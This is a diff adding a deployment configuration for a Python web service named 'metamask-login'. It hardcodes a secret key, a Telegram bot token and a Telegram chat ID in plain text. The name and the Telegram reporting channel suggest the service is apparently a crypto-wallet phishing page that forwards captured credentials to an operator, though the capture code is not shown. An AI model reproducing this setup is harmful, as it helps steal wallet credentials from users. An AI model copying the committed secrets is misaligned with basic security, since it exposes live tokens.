@@ -1,0 +1,16 @@
+services:
+  - type: web
+    name: metamask-login
+    env: python
+    buildCommand: pip install -r requirements.txt
+    startCommand: gunicorn wsgi:app
+    envVars:
+      - key: SECRET_KEY
+        value: d2c45fb6a2e9c7b8d1f4e3a0b5c8d9e6f7a2b3c4d5e6f7a8b9c0d1e2f3a4b5
+      - key: TELEGRAM_BOT_TOKEN
+        value: 7852920019:AAFfrg0doyB8YnLg660dunZ6PYvn5sxBHfs
+      - key: TELEGRAM_CHAT_ID
+        value: -4674560339
+      - key: PORT
+        value: 5000
+    autoDeploy: true 
